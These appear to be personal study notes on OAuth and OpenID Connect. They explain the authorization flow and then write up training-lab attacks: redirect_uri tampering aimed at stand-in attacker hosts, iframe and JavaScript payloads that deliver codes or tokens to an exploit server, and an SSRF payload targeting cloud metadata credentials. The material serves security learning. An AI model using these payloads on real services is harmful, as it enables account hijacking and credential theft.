## Basic Information

Oauth is  a Authorization  framework that enables application to access or perform actions on a user's account in another application

## methodology

example.com is designed to showcase all our social media posts 

example.com will request our permission to access your social media posts a consent screen will appear on the sociamedia.com outlining the permissions being requested and the developer making the request. 


- resource owner: user , authorizer to your resource , like social media account 

- resource server:  the server managing authenticated requests after the application has secured an `access token` on behalf of the `resource owner`

- client application:  the application seeking authorization form the `resource owner` such as `example.com`

- authorization server: the server that issues `access token` to the `client application` following the successful authentication of the `resource owner` and securing authorization 
- client id: public , unique identifier for the application
- client secret: A confidential key ,known solely to the ***application and the authorization server*** , used to generating `access_token`
- response type: A value specifying the type of token requested, like `code`
- scope: the level of access the `client application` is requesting from the `resource owner`
- redirected URL: the URL to which the user is redirected after authorization 
- state: a parameter to maintain data across the user's redirection to and from the authorization server. kinda like CSRF protection mechanism.
- grant type: parameter indicating the grant type and the type of token to be returned
- code: the authorization code from the `authorization server` use in tandem with `client id` and `client secret` by the client application to acquire an `access token`
- access token:  the token that the client application uses for API requests on behalf of the `resource owner` 
- refresh token: enables the application to obtain a new `access token` without re prompting the user.
## FLOW


1) navigate to example.com and select integrate with social media 
2) the site requests social.com asking for authorization to let example.com application access your posts structured as 
``` HTTP
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3) present with consent page
4) social media sends a response to the `redirect uri` with the `code` and `state` parameter ````
https://example.com?code=uniqueCode123&state=randomString123
5)  example.com utilizes `code` together with its `client id` and `client secret` to make a server side request to obtain an `access token` on our behalf, enabling access to the permission we consented: 

```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6) finally, the process concludes as example.com employs your `access token` to make an API call


## OpenID Connect

- extends the Oauth protocol to provide a dedicated id and authentication layer that sits on top of the basic Oauth implementation. 
-  the key diffrerence is that there is an additional , set of scopes that are the same for all providers and extra response type: `id_token`

### Methodology

- Relying party:  the application that is requesting authentication of a user. 
- End user: user who is being authenticated
- openID provider: Oauth service that is configured to support openID Connect

- Claims refer to `Key:Value` pairs that represent information about the user on the resource server.
- ID token: returns JWT token  signed with a JSON web sig. JWT payload contains list of claims based on the scope that was initially requested.
### Methods

 Leaking authorization codes and access tokens
- by stealing a valid code or token the attacker may be able to access the victim's data. Ultimately this can completely compromise their account - the attacker could potentially log in as the victim user on any client application that is registered with this Outh service  the token is sent via victim's browser to the `/callback` endpoint that is specified in the `redirected uri`  if the Oauth service fails to validate the URI properly an attacker may be able to construct a CSRF like attack tricking the victims browser into initialting an Oauth flow that send the code to an attacker controlled `redict uri`


Flawed redirect uri  validation


-  try and fuzz with the `redirected uri`  para 
	-  some checks only that the string starts with the correct seqence of chars approves the domain, try removing or adding arbitrary paths
	-  try appending extra values to the default `redirect uri` param like ``https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/``
	-  try server side param pollution  ``https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net``
	-  also try ``localhost.evil-user.net`.`
	- changing the `response_mode` from `query` to `fragment` can sometimes completely alter the parsing of the `redirect_uri`,

Stealing codes and access tokens via proxy page 
- try to find ways that you can successfully acccess different subdomains or paths , the default URI will often be on an Oauth such as /Oauth/callback which is likely to have intersting subdirectories.  so try this ``https://client-app.com/oauth/callback/../../example/path``
- once  we identified which other pages we are able to set as the redirect URI 


### Flawed scope validation


- it may be possible  for an attacker to "upgrade" an access token with extra permissions due to flawed Oauth service.

- attacker malicious client application initially requested access to the user's email using `openid email`

``` HTTP
POST /token Host: oauth-authorization-server.com … client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code
```

- end a normal browser-based request to the OAuth service's `/userinfo` endpoint, manually adding a new `scope` parameter in the process.
- 

# LABS

###  Authentication bypass via OAuth implicit flow

POST /auth
`
`{"email":"carlos@carlos-montoya.net"`

right click to request in original session



### Forced OAuth profile linking

whole idea is that we have in the account attach social media which is outh that does a get from the 3rd party to provide a  token that attaches the social account to a specific account 

- when we insert the credential we drop this token that is used to attach the social account to the account then we create a link that would use this code to access the attach  our social media to their account that we can access from the login social media 

``` html
<iframe src="https://0a3500c204e96dd380628ae200dc0028.web-security-academy.net/oauth-linking?code=xxhYSZilXDl4VcyAE5o4HBKzNR7snAaDjJAh7LECpql"> </iframe>

```


###  OAuth account hijacking via redirect_uri


in this attack what we basically did since there is no redirect authentication in the /auth request we conducted an attack to place our payload so that when the oauth flow finish it gets `redirected` to us with the secret code 

- check if the redirect_uri accepts arbitrary url like collab

```html 
<iframe src="https://oauth-0a4a00ca04e0e2d1d3c7d7eb029b0000.oauth-server.net/auth?client_id=pufrsuk179far9qmbg3lk&redirect_uri=https://collab.com&response_type=code&scope=openid%20profile%20email"></iframe>
```


### Stealing OAuth access tokens via an open redirect

the app is vulnrable to open redirect in the next post  
``` http
GET /post/next?path=zwz84exk5rh1qs51lm183q5wmnseg84x.oastify.com 
```

so what i did is craft the AUTH redirect Uri with this traversal of the callback to the `post/path` returning  back the token to my exploit server

```js
<script>
    if (!document.location.hash) {
        window.location = "https://oauth-0ad4008c03b817cb81b97d10027600bd.oauth-server.net/auth?client_id=ppc4b5fd5uioni6tszujq&redirect_uri=https://0a8e000b0369171d818e7fb300cb0042.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a3200e7036b171f81d97ede01fe00a0.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email"
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```


then use the token retrieved in the `/me`  authorization `bearer`


### SSRF via OpenID dynamic client registration

visit the well known endpoint 

``` http
GET /.well-known/openid-configuration HTTP/2
Host: oauth-0a1f009b048de21f9209387502600002.oauth-server.net
```

as a response i set of URL , i noticed a  `/reg`  after visiting it i saw that there is  error of no redirected uris in the body 

```json 
{
    "redirect_uris" : [
        "https://example.com"
    ]
}
```


add this `   "logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"` 
then go to client  to `/client/clientid/logo`
submit secret access token 


# References
- https://www.marcobehler.com/images/guides/oauth2/oauth2_flow_v2-8c394ca4.png
- https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover